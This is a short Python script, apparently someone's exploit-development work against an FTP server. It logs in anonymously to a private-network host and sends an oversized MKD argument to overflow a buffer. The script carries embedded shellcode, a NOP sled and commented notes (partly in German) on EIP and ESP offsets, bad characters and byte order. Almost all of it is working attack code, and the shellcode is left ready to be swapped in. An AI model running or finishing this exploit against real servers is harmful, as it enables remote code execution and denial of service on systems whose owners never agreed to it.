#!/usr/bin/python
 
import socket
import sys

shellcode = ("\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3"
"\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92")
D = "\x90"*20 + shellcode


padding=["A"*247,"C"*8]
#0x 76 83 00 00 | 0x 76 8e f0 00
#\x00\x00\x83\x76 | \x00\xf0\x8e\x76
##################0x762b0000 | 0x762c7000
#\x00\xf0\x8e\x76


#wie wäre es wenn ich \x00 mit einer 0 ersetze? Geht auch nicht. Kommt 30 raus! Also gehe ich es anders an. Ich ändere den Teil der Adresse mit der 30 zu 0! Es kommt . als ASCII raus. Kurz ASCII->HEX=\x2e!

evil = padding[0]+"A"*4+padding[1]+"D"*150#D+"E"*(749-len(D)) #B=EIP&D=ESP

#\x00\x0A\x0D are bad characters only in this case! When you use these, the EIP won't be set correctly!
#never use r""
#03 19 FB F8 -> \xf8\xfb\x19\x03 #"Keep in mind that we will need to reverse the byte order due to the Little Endian architecture of the CPU."
#"A"*247+"B"*4+"C"*8+"D"*50+"E"*100#A und C,E sind nur Paddings. B = EIP und D = ESP.ACHTUNG: D und E sind in dem Fall ESP! Hinter ESP kommt nichts. Auch keine Paddings!
#always use the same max_length
#"A"*159+"B"*50+"C"*30+"D"*8+"E"*4+"F"*8 #248 is position of EIP - in this case "E"
#"A"*259+"B"*1 #260 is position of ESP - in this case "B"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.65.1',21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close